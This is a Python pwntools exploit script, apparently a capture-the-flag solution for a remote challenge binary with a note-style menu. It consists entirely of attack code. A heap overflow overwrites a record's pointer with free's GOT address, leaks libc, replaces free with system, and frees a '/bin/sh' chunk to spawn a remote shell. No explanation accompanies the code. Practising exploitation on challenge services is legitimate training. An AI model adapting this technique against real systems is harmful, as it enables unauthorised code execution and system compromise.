from pwn import *

sh=remote("node5.buuoj.cn",29142)
#elf=ELF("./timu")
libc=ELF("./libc-2.23.so")

def alloc(size,name,length,text):
	sh.recvuntil(b'Action: ')
	sh.sendline(b'0')
	sh.recvuntil(b'size of description: ')
	sh.sendline(str(size))
	sh.recvuntil(b'name: ')
	sh.sendline(name)
	sh.recvuntil(b'text length: ')
	sh.sendline(str(length))
	sh.recvuntil(b'text: ')
	sh.sendline(text)
def free(id):
	sh.recvuntil(b'Action: ')
	sh.sendline(b'1')
	sh.recvuntil(b'index: ')
	sh.sendline(str(id))
def show(id):
	sh.recvuntil(b'Action: ')
	sh.sendline(b'2')
	sh.recvuntil(b'index: ')
	sh.sendline(str(id))
def edit(id,length,text):
	sh.recvuntil(b'Action: ')
	sh.sendline(b'3')
	sh.recvuntil(b'index: ')
	sh.sendline(str(id))
	sh.recvuntil(b'text length: ')
	sh.sendline(str(length))
	sh.recvuntil(b'text: ')
	sh.sendline(text)

free_got=0x0804B010

alloc(0x80,b"name1",0x80,b"aaaa") #0
alloc(0x80,b"name2",0x80,b"aaaa") #1
alloc(0x80,b"name3",0x80,b"/bin/sh\x00") #2

free(0)
alloc(0x100,b"name4",0x100,b"aaaa") #3
payload=0x108*b'a'+0x8*b'a'+0x80*b'a'+0x8*b'a'+p32(free_got)
edit(3,0x200,payload)

show(1)
sh.recvuntil(b'description: ')
free_addr=u32(sh.recv(4))
libc_base=free_addr-libc.sym["free"]
print("libc_base=",hex(libc_base))
system_addr=libc_base+libc.sym["system"]

edit(1,0x80,p32(system_addr))
free(2)
sh.interactive()


